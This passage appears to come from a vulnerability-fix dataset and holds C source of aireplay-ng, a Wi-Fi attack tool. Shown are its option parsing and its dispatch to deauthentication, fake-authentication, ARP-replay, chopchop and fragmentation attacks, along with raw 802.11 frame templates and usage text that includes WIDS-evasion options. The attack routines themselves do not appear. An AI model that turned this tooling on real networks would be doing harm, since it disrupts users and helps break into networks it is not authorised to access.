[>=0]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'n' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_maxlen );\n                if( opt.f_maxlen < 0 || ret != 1 )\n                {\n                    printf( \"Invalid maximum length filter. [>=0]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'u' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_type );\n                if( opt.f_type < 0 || opt.f_type > 3 || ret != 1 )\n                {\n                    printf( \"Invalid type filter. [0-3]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'v' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_subtype );\n                if( opt.f_subtype < 0 || opt.f_subtype > 15 || ret != 1 )\n                {\n                    printf( \"Invalid subtype filter. [0-15]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'T' :\n\t\tret = sscanf(optarg, \"%d\", &opt.f_retry);\n\t\tif ((opt.f_retry < 1) || (opt.f_retry > 65535) || (ret != 1)) {\n\t\t\tprintf(\"Invalid retry setting. [1-65535]\\n\");\n\t\t\tprintf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n\t\t\treturn(1);\n\t\t}\n\t\tbreak;\n\n            case 't' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_tods );\n                if(( opt.f_tods != 0 && opt.f_tods != 1 ) || ret != 1 )\n                {\n                    printf( \"Invalid tods filter. [0,1]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'f' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_fromds );\n                if(( opt.f_fromds != 0 && opt.f_fromds != 1 ) || ret != 1 )\n                {\n                    printf( \"Invalid fromds filter. [0,1]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'w' :\n\n                ret = sscanf( optarg, \"%d\", &opt.f_iswep );\n                if(( opt.f_iswep != 0 && opt.f_iswep != 1 ) || ret != 1 )\n                {\n                    printf( \"Invalid wep filter. [0,1]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'x' :\n\n                ret = sscanf( optarg, \"%d\", &opt.r_nbpps );\n                if( opt.r_nbpps < 1 || opt.r_nbpps > 1024 || ret != 1 )\n                {\n                    printf( \"Invalid number of packets per second. [1-1024]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'o' :\n\n                ret = sscanf( optarg, \"%d\", &opt.npackets );\n                if( opt.npackets < 0 || opt.npackets > 512 || ret != 1 )\n                {\n                    printf( \"Invalid number of packets per burst. [0-512]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'q' :\n\n                ret = sscanf( optarg, \"%d\", &opt.delay );\n                if( opt.delay < 1 || opt.delay > 600 || ret != 1 )\n                {\n                    printf( \"Invalid number of seconds. [1-600]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'Q' :\n\n                opt.reassoc = 1;\n                break;\n\n            case 'p' :\n\n                ret = sscanf( optarg, \"%x\", &opt.r_fctrl );\n                if( opt.r_fctrl < 0 || opt.r_fctrl > 65535 || ret != 1 )\n                {\n                    printf( \"Invalid frame control word. [0-65535]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'a' :\n\n                if( getmac( optarg, 1, opt.r_bssid ) != 0 )\n                {\n                    printf( \"Invalid AP MAC address.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'c' :\n\n                if( getmac( optarg, 1, opt.r_dmac ) != 0 )\n                {\n                    printf( \"Invalid destination MAC address.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'g' :\n\n                ret = sscanf( optarg, \"%d\", &opt.ringbuffer );\n                if( opt.ringbuffer < 1 || ret != 1 )\n                {\n                    printf( \"Invalid replay ring buffer size. [>=1]\\n\");\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case 'h' :\n\n                if( getmac( optarg, 1, opt.r_smac ) != 0 )\n                {\n                    printf( \"Invalid source MAC address.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.r_smac_set=1;\n                break;\n\n            case 'e' :\n\n                memset(  opt.r_essid, 0, sizeof( opt.r_essid ) );\n                strncpy( opt.r_essid, optarg, sizeof( opt.r_essid )  - 1 );\n                break;\n\n            case 'j' :\n\n                opt.r_fromdsinj = 1;\n                break;\n\n            case 'D' :\n\n                opt.nodetect = 1;\n                break;\n\n            case 'k' :\n\n                inet_aton( optarg, (struct in_addr *) opt.r_dip );\n                break;\n\n            case 'l' :\n\n                inet_aton( optarg, (struct in_addr *) opt.r_sip );\n                break;\n\n            case 'y' :\n\n                if( opt.prga != NULL )\n                {\n                    printf( \"PRGA file already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                if( read_prga(&(opt.prga), optarg) != 0 )\n                {\n                    return( 1 );\n                }\n                break;\n\n            case 'i' :\n\n                if( opt.s_face != NULL || opt.s_file )\n                {\n                    printf( \"Packet source already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.s_face = optarg;\n                opt.port_in = get_ip_port(opt.s_face, opt.ip_in, sizeof(opt.ip_in)-1);\n                break;\n\n            case 'r' :\n\n                if( opt.s_face != NULL || opt.s_file )\n                {\n                    printf( \"Packet source already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.s_file = optarg;\n                break;\n\n            case 'z' :\n\n                opt.ghost = 1;\n\n                break;\n\n            case '0' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 0;\n\n                for (i=0; optarg[i] != 0; i++)\n                {\n                    if (isdigit((int)optarg[i]) == 0)\n                        break;\n                }\n\n                ret = sscanf( optarg, \"%d\", &opt.a_count );\n                if( opt.a_count < 0 || optarg[i] != 0 || ret != 1)\n                {\n                    printf( \"Invalid deauthentication count or missing value. [>=0]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case '1' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 1;\n\n                for (i=0; optarg[i] != 0; i++)\n                {\n                    if (isdigit((int)optarg[i]) == 0)\n                        break;\n                }\n\n                ret = sscanf( optarg, \"%d\", &opt.a_delay );\n                if( opt.a_delay < 0 || optarg[i] != 0 || ret != 1)\n                {\n                    printf( \"Invalid reauthentication delay or missing value. [>=0]\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                break;\n\n            case '2' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 2;\n                break;\n\n            case '3' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 3;\n                break;\n\n            case '4' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 4;\n                break;\n\n            case '5' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 5;\n                break;\n\n            case '6' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 6;\n                break;\n\n            case '7' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 7;\n                break;\n\n            case '9' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 9;\n                break;\n\n            case '8' :\n\n                if( opt.a_mode != -1 )\n                {\n                    printf( \"Attack mode already specified.\\n\" );\n                    printf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n                    return( 1 );\n                }\n                opt.a_mode = 8;\n                break;\n\n            case 'F' :\n\n                opt.fast = 1;\n                break;\n\n            case 'B' :\n\n                opt.bittest = 1;\n                break;\n\n            case 'H' :\n\n                printf( usage, getVersion(\"Aireplay-ng\", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC)  );\n                return( 1 );\n\n            case 'R' :\n\n                opt.rtc = 0;\n                break;\n\n            default : goto usage;\n        }\n    }\n\n    if( argc - optind != 1 )\n    {\n    \tif(argc == 1)\n    \t{\nusage:\n\t        printf( usage, getVersion(\"Aireplay-ng\", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC)  );\n        }\n\t    if( argc - optind == 0)\n\t    {\n\t    \tprintf(\"No replay interface specified.\\n\");\n\t    }\n\t    if(argc > 1)\n\t    {\n    \t\tprintf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n\t    }\n        return( 1 );\n    }\n\n    if( opt.a_mode == -1 )\n    {\n        printf( \"Please specify an attack mode.\\n\" );\n   \t\tprintf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n        return( 1 );\n    }\n\n    if( (opt.f_minlen > 0 && opt.f_maxlen > 0) && opt.f_minlen > opt.f_maxlen )\n    {\n        printf( \"Invalid length filter (min(-m):%d > max(-n):%d).\\n\",\n                opt.f_minlen, opt.f_maxlen );\n  \t\tprintf(\"\\\"%s --help\\\" for help.\\n\", argv[0]);\n        return( 1 );\n    }\n\n    if ( opt.f_tods == 1 && opt.f_fromds == 1 )\n    {\n        printf( \"FromDS and ToDS bit are set: packet has to come from the AP and go to the AP\\n\" );\n    }\n\n    dev.fd_rtc = -1;\n\n    /* open the RTC device if necessary */\n\n#if defined(__i386__)\n#if defined(linux)\n    if( opt.a_mode > 1 )\n    {\n        if( ( dev.fd_rtc = open( \"/dev/rtc0\", O_RDONLY ) ) < 0 )\n        {\n            dev.fd_rtc = 0;\n        }\n\n        if( (dev.fd_rtc == 0) && ( ( dev.fd_rtc = open( \"/dev/rtc\", O_RDONLY ) ) < 0 ) )\n        {\n            dev.fd_rtc = 0;\n        }\n        if(opt.rtc == 0)\n        {\n            dev.fd_rtc = -1;\n        }\n        if(dev.fd_rtc > 0)\n        {\n            if( ioctl( dev.fd_rtc, RTC_IRQP_SET, RTC_RESOLUTION ) < 0 )\n            {\n                perror( \"ioctl(RTC_IRQP_SET) failed\" );\n                printf(\n    \"Make sure enhanced rtc device support is enabled in the kernel (module\\n\"\n    \"rtc, not genrtc) - also try 'echo 1024 >/proc/sys/dev/rtc/max-user-freq'.\\n\" );\n                close( dev.fd_rtc );\n                dev.fd_rtc = -1;\n            }\n            else\n            {\n                if( ioctl( dev.fd_rtc, RTC_PIE_ON, 0 ) < 0 )\n                {\n                    perror( \"ioctl(RTC_PIE_ON) failed\" );\n                    close( dev.fd_rtc );\n                    dev.fd_rtc = -1;\n                }\n            }\n        }\n        else\n        {\n            printf( \"For information, no action required:\"\n                    \" Using gettimeofday() instead of /dev/rtc\\n\" );\n            dev.fd_rtc = -1;\n        }\n\n    }\n#endif /* linux */\n#endif /* i386 */\n\n    opt.iface_out = argv[optind];\n    opt.port_out = get_ip_port(opt.iface_out, opt.ip_out, sizeof(opt.ip_out)-1);\n\n    //don't open interface(s) when using test mode and airserv\n    if( ! (opt.a_mode == 9 && opt.port_out >= 0 ) )\n    {\n        /* open the replay interface */\n        _wi_out = wi_open(opt.iface_out);\n        if (!_wi_out)\n            return 1;\n        dev.fd_out = wi_fd(_wi_out);\n\n        /* open the packet source */\n        if( opt.s_face != NULL )\n        {\n            //don't open interface(s) when using test mode and airserv\n            if( ! (opt.a_mode == 9 && opt.port_in >= 0 ) )\n            {\n                _wi_in = wi_open(opt.s_face);\n                if (!_wi_in)\n                    return 1;\n                dev.fd_in = wi_fd(_wi_in);\n                wi_get_mac(_wi_in, dev.mac_in);\n            }\n        }\n        else\n        {\n            _wi_in = _wi_out;\n            dev.fd_in = dev.fd_out;\n\n            /* XXX */\n            dev.arptype_in = dev.arptype_out;\n            wi_get_mac(_wi_in, dev.mac_in);\n        }\n\n        wi_get_mac(_wi_out, dev.mac_out);\n    }\n\n    /* drop privileges */\n    if (setuid( getuid() ) == -1) {\n\t\tperror(\"setuid\");\n\t}\n\n    /* XXX */\n    if( opt.r_nbpps == 0 )\n    {\n        if( dev.is_wlanng || dev.is_hostap )\n            opt.r_nbpps = 200;\n        else\n            opt.r_nbpps = 500;\n    }\n\n\n    if( opt.s_file != NULL )\n    {\n        if( ! ( dev.f_cap_in = fopen( opt.s_file, \"rb\" ) ) )\n        {\n            perror( \"open failed\" );\n            return( 1 );\n        }\n\n        n = sizeof( struct pcap_file_header );\n\n        if( fread( &dev.pfh_in, 1, n, dev.f_cap_in ) != (size_t) n )\n        {\n            perror( \"fread(pcap file header) failed\" );\n            return( 1 );\n        }\n\n        if( dev.pfh_in.magic != TCPDUMP_MAGIC &&\n            dev.pfh_in.magic != TCPDUMP_CIGAM )\n        {\n            fprintf( stderr, \"\\\"%s\\\" isn't a pcap file (expected \"\n                             \"TCPDUMP_MAGIC).\\n\", opt.s_file );\n            return( 1 );\n        }\n\n        if( dev.pfh_in.magic == TCPDUMP_CIGAM )\n            SWAP32(dev.pfh_in.linktype);\n\n        if( dev.pfh_in.linktype != LINKTYPE_IEEE802_11 &&\n            dev.pfh_in.linktype != LINKTYPE_PRISM_HEADER &&\n            dev.pfh_in.linktype != LINKTYPE_RADIOTAP_HDR &&\n            dev.pfh_in.linktype != LINKTYPE_PPI_HDR )\n        {\n            fprintf( stderr, \"Wrong linktype from pcap file header \"\n                             \"(expected LINKTYPE_IEEE802_11) -\\n\"\n                             \"this doesn't look like a regular 802.11 \"\n                             \"capture.\\n\" );\n            return( 1 );\n        }\n    }\n\n    //if there is no -h given, use default hardware mac\n    if( maccmp( opt.r_smac, NULL_MAC) == 0 )\n    {\n        memcpy( opt.r_smac, dev.mac_out, 6);\n        if(opt.a_mode != 0 && opt.a_mode != 4 && opt.a_mode != 9)\n        {\n            printf(\"No source MAC (-h) specified. Using the device MAC (%02X:%02X:%02X:%02X:%02X:%02X)\\n\",\n                    dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5]);\n        }\n    }\n\n    if( maccmp( opt.r_smac, dev.mac_out) != 0 && maccmp( opt.r_smac, NULL_MAC) != 0)\n    {\n//        if( dev.is_madwifi && opt.a_mode == 5 ) printf(\"For --fragment to work on madwifi[-ng], set the interface MAC according to (-h)!\\n\");\n        fprintf( stderr, \"The interface MAC (%02X:%02X:%02X:%02X:%02X:%02X)\"\n                 \" doesn't match the specified MAC (-h).\\n\"\n                 \"\\tifconfig %s hw ether %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                 dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5],\n                 opt.iface_out, opt.r_smac[0], opt.r_smac[1], opt.r_smac[2], opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );\n    }\n\n    switch( opt.a_mode )\n    {\n        case 0 : return( do_attack_deauth()      );\n        case 1 : return( do_attack_fake_auth()   );\n        case 2 : return( do_attack_interactive() );\n        case 3 : return( do_attack_arp_resend()  );\n        case 4 : return( do_attack_chopchop()    );\n        case 5 : return( do_attack_fragment()    );\n        case 6 : return( do_attack_caffe_latte() );\n        case 7 : return( do_attack_cfrag()       );\n        case 8 : return( do_attack_migmode()     );\n        case 9 : return( do_attack_test()        );\n        default: break;\n    }\n\n    /* that's all, folks */\n\n    return( 0 );\n}\n"], "fixing_code": ["/*\n *  802.11 WEP replay & injection attacks\n *\n *  Copyright (C) 2006-2013 Thomas d'Otreppe\n *  Copyright (C) 2004, 2005 Christophe Devine\n *\n *  WEP decryption attack (chopchop) developed by KoreK\n *\n *  This program is free software; you can redistribute it and/or modify\n *  it under the terms of the GNU General Public License as published by\n *  the Free Software Foundation; either version 2 of the License, or\n *  (at your option) any later version.\n *\n *  This program is distributed in the hope that it will be useful,\n *  but WITHOUT ANY WARRANTY; without even the implied warranty of\n *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *  GNU General Public License for more details.\n *\n *  You should have received a copy of the GNU General Public License\n *  along with this program; if not, write to the Free Software\n *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA\n *\n *\n *  In addition, as a special exception, the copyright holders give\n *  permission to link the code of portions of this program with the\n *  OpenSSL library under certain conditions as described in each\n *  individual source file, and distribute linked combinations\n *  including the two.\n *  You must obey the GNU General Public License in all respects\n *  for all of the code used other than OpenSSL. *  If you modify\n *  file(s) with this exception, you may extend this exception to your\n *  version of the file(s), but you are not obligated to do so. *  If you\n *  do not wish to do so, delete this exception statement from your\n *  version. *  If you delete this exception statement from all source\n *  files in the program, then also delete it here.\n */\n\n#if defined(linux)\n    #include <linux/rtc.h>\n#endif\n\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <sys/ioctl.h>\n#include <sys/wait.h>\n#include <sys/time.h>\n\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <dirent.h>\n#include <signal.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <errno.h>\n#include <time.h>\n#include <getopt.h>\n\n#include <fcntl.h>\n#include <ctype.h>\n\n#include <limits.h>\n\n#include <netinet/in_systm.h>\n#include <netinet/ip.h>\n#include <netinet/tcp.h>\n\n#include \"version.h\"\n#include \"pcap.h\"\n#include \"osdep/osdep.h\"\n#include \"crypto.h\"\n#include \"common.h\"\n\n#define RTC_RESOLUTION  8192\n\n#define REQUESTS    30\n#define MAX_APS     20\n\n#define NEW_IV  1\n#define RETRY   2\n#define ABORT   3\n\n#define DEAUTH_REQ      \\\n    \"\\xC0\\x00\\x3A\\x01\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\" \\\n    \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\x00\\x00\\x07\\x00\"\n\n#define AUTH_REQ        \\\n    \"\\xB0\\x00\\x3A\\x01\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\" \\\n    \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xB0\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"\n\n#define ASSOC_REQ       \\\n    \"\\x00\\x00\\x3A\\x01\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"  \\\n    \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xC0\\x00\\x31\\x04\\x64\\x00\"\n\n#define REASSOC_REQ       \\\n    \"\\x20\\x00\\x3A\\x01\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"  \\\n    \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xC0\\x00\\x31\\x04\\x64\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n#define NULL_DATA       \\\n    \"\\x48\\x01\\x3A\\x01\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"  \\\n    \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xE0\\x1B\"\n\n#define RTS             \\\n    \"\\xB4\\x00\\x4E\\x04\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"\n\n#define RATES           \\\n    \"\\x01\\x04\\x02\\x04\\x0B\\x16\\x32\\x08\\x0C\\x12\\x18\\x24\\x30\\x48\\x60\\x6C\"\n\n#define PROBE_REQ       \\\n    \"\\x40\\x00\\x00\\x00\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\"  \\\n    \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\x00\\x00\"\n\n#define RATE_NUM 12\n\n#define RATE_1M 1000000\n#define RATE_2M 2000000\n#define RATE_5_5M 5500000\n#define RATE_11M 11000000\n\n#define RATE_6M 6000000\n#define RATE_9M 9000000\n#define RATE_12M 12000000\n#define RATE_18M 18000000\n#define RATE_24M 24000000\n#define RATE_36M 36000000\n#define RATE_48M 48000000\n#define RATE_54M 54000000\n\nint bitrates[RATE_NUM]={RATE_1M, RATE_2M, RATE_5_5M, RATE_6M, RATE_9M, RATE_11M, RATE_12M, RATE_18M, RATE_24M, RATE_36M, RATE_48M, RATE_54M};\n\nextern char * getVersion(char * progname, int maj, int min, int submin, int svnrev, int beta, int rc);\nextern int maccmp(unsigned char *mac1, unsigned char *mac2);\nextern unsigned char * getmac(char * macAddress, int strict, unsigned char * mac);\nextern int check_crc_buf( unsigned char *buf, int len );\nextern const unsigned long int crc_tbl[256];\nextern const unsigned char crc_chop_tbl[256][4];\n\nchar usage[] =\n\n\"\\n\"\n\"  %s - (C) 2006-2013 Thomas d\\'Otreppe\\n\"\n\"  http://www.aircrack-ng.org\\n\"\n\"\\n\"\n\"  usage: aireplay-ng <options> <replay interface>\\n\"\n\"\\n\"\n\"  Filter options:\\n\"\n\"\\n\"\n\"      -b bssid  : MAC address, Access Point\\n\"\n\"      -d dmac   : MAC address, Destination\\n\"\n\"      -s smac   : MAC address, Source\\n\"\n\"      -m len    : minimum packet length\\n\"\n\"      -n len    : maximum packet length\\n\"\n\"      -u type   : frame control, type    field\\n\"\n\"      -v subt   : frame control, subtype field\\n\"\n\"      -t tods   : frame control, To      DS bit\\n\"\n\"      -f fromds : frame control, From    DS bit\\n\"\n\"      -w iswep  : frame control, WEP     bit\\n\"\n\"      -D        : disable AP detection\\n\"\n\"\\n\"\n\"  Replay options:\\n\"\n\"\\n\"\n\"      -x nbpps  : number of packets per second\\n\"\n\"      -p fctrl  : set frame control word (hex)\\n\"\n\"      -a bssid  : set Access Point MAC address\\n\"\n\"      -c dmac   : set Destination  MAC address\\n\"\n\"      -h smac   : set Source       MAC address\\n\"\n\"      -g value  : change ring buffer size (default: 8)\\n\"\n\"      -F        : choose first matching packet\\n\"\n\"\\n\"\n\"      Fakeauth attack options:\\n\"\n\"\\n\"\n\"      -e essid  : set target AP SSID\\n\"\n\"      -o npckts : number of packets per burst (0=auto, default: 1)\\n\"\n\"      -q sec    : seconds between keep-alives\\n\"\n\"      -Q        : send reassociation requests\\n\"\n\"      -y prga   : keystream for shared key auth\\n\"\n\"      -T n      : exit after retry fake auth request n time\\n\"\n\"\\n\"\n\"      Arp Replay attack options:\\n\"\n\"\\n\"\n\"      -j        : inject FromDS packets\\n\"\n\"\\n\"\n\"      Fragmentation attack options:\\n\"\n\"\\n\"\n\"      -k IP     : set destination IP in fragments\\n\"\n\"      -l IP     : set source IP in fragments\\n\"\n\"\\n\"\n\"      Test attack options:\\n\"\n\"\\n\"\n\"      -B        : activates the bitrate test\\n\"\n\"\\n\"\n/*\n\"  WIDS evasion options:\\n\"\n\"      -y value  : Use packets older than n packets\\n\"\n\"      -z        : Ghosting\\n\"\n\"\\n\"\n*/\n\"  Source options:\\n\"\n\"\\n\"\n\"      -i iface  : capture packets from this interface\\n\"\n\"      -r file   : extract packets from this pcap file\\n\"\n\"\\n\"\n\"  Miscellaneous options:\\n\"\n\"\\n\"\n\"      -R                    : disable /dev/rtc usage\\n\"\n\"      --ignore-negative-one : if the interface's channel can't be determined,\\n\"\n\"                              ignore the mismatch, needed for unpatched cfg80211\\n\"\n\"\\n\"\n\"  Attack modes (numbers can still be used):\\n\"\n\"\\n\"\n\"      --deauth      count : deauthenticate 1 or all stations (-0)\\n\"\n\"      --fakeauth    delay : fake authentication with AP (-1)\\n\"\n\"      --interactive       : interactive frame selection (-2)\\n\"\n\"      --arpreplay         : standard ARP-request replay (-3)\\n\"\n\"      --chopchop          : decrypt/chopchop WEP packet (-4)\\n\"\n\"      --fragment          : generates valid keystream   (-5)\\n\"\n\"      --caffe-latte       : query a client for new IVs  (-6)\\n\"\n\"      --cfrag             : fragments against a client  (-7)\\n\"\n\"      --migmode           : attacks WPA migration mode  (-8)\\n\"\n\"      --test              : tests injection and quality (-9)\\n\"\n\"\\n\"\n\"      --help              : Displays this usage screen\\n\"\n\"\\n\";\n\n\nstruct options\n{\n    unsigned char f_bssid[6];\n    unsigned char f_dmac[6];\n    unsigned char f_smac[6];\n    int f_minlen;\n    int f_maxlen;\n    int f_type;\n    int f_subtype;\n    int f_tods;\n    int f_fromds;\n    int f_iswep;\n\n    int r_nbpps;\n    int r_fctrl;\n    unsigned char r_bssid[6];\n    unsigned char r_dmac[6];\n    unsigned char r_smac[6];\n    unsigned char r_dip[4];\n    unsigned char r_sip[4];\n    char r_essid[33];\n    int r_fromdsinj;\n    char r_smac_set;\n\n    char ip_out[16];    //16 for 15 chars + \\x00\n    char ip_in[16];\n    int port_out;\n    int port_in;\n\n    char *iface_out;\n    char *s_face;\n    char *s_file;\n    unsigned char *prga;\n\n    int a_mode;\n    int a_count;\n    int a_delay;\n\tint f_retry;\n\n    int ringbuffer;\n    int ghost;\n    int prgalen;\n\n    int delay;\n    int npackets;\n\n    int fast;\n    int bittest;\n\n    int nodetect;\n    int ignore_negative_one;\n    int rtc;\n\n    int reassoc;\n}\nopt;\n\nstruct devices\n{\n    int fd_in,  arptype_in;\n    int fd_out, arptype_out;\n    int fd_rtc;\n\n    unsigned char mac_in[6];\n    unsigned char mac_out[6];\n\n    int is_wlanng;\n    int is_hostap;\n    int is_madwifi;\n    int is_madwifing;\n    int is_bcm43xx;\n\n    FILE *f_cap_in;\n\n    struct pcap_file_header pfh_in;\n}\ndev;\n\nstatic struct wif *_wi_in, *_wi_out;\n\nstruct ARP_req\n{\n    unsigned char *buf;\n    int hdrlen;\n    int len;\n};\n\nstruct APt\n{\n    unsigned char set;\n    unsigned char found;\n    unsigned char len;\n    unsigned char essid[255];\n    unsigned char bssid[6];\n    unsigned char chan;\n    unsigned int  ping[REQUESTS];\n    int  pwr[REQUESTS];\n};\n\nstruct APt ap[MAX_APS];\n\nunsigned long nb_pkt_sent;\nunsigned char h80211[4096];\nunsigned char tmpbuf[4096];\nunsigned char srcbuf[4096];\nchar strbuf[512];\n\nunsigned char ska_auth1[]     = \"\\xb0\\x00\\x3a\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                        \"\\x00\\x00\\x00\\x00\\x00\\x00\\xb0\\x01\\x01\\x00\\x01\\x00\\x00\\x00\";\n\nunsigned char ska_auth3[4096] = \"\\xb0\\x40\\x3a\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                        \"\\x00\\x00\\x00\\x00\\x00\\x00\\xc0\\x01\";\n\n\nint ctrl_c, alarmed;\n\nchar * iwpriv;\n\n\nvoid sighandler( int signum )\n{\n    if( signum == SIGINT )\n        ctrl_c++;\n\n    if( signum == SIGALRM )\n        alarmed++;\n}\n\nint reset_ifaces()\n{\n    //close interfaces\n    if(_wi_in != _wi_out)\n    {\n        if(_wi_in)\n        {\n            wi_close(_wi_in);\n            _wi_in = NULL;\n        }\n        if(_wi_out)\n        {\n            wi_close(_wi_out);\n            _wi_out = NULL;\n        }\n    }\n    else\n    {\n        if(_wi_out)\n        {\n            wi_close(_wi_out);\n            _wi_out = NULL;\n            _wi_in = NULL;\n        }\n    }\n\n    /* open the replay interface */\n    _wi_out = wi_open(opt.iface_out);\n    if (!_wi_out)\n        return 1;\n    dev.fd_out = wi_fd(_wi_out);\n\n    /* open the packet source */\n    if( opt.s_face != NULL )\n    {\n        _wi_in = wi_open(opt.s_face);\n        if (!_wi_in)\n            return 1;\n        dev.fd_in = wi_fd(_wi_in);\n        wi_get_mac(_wi_in, dev.mac_in);\n    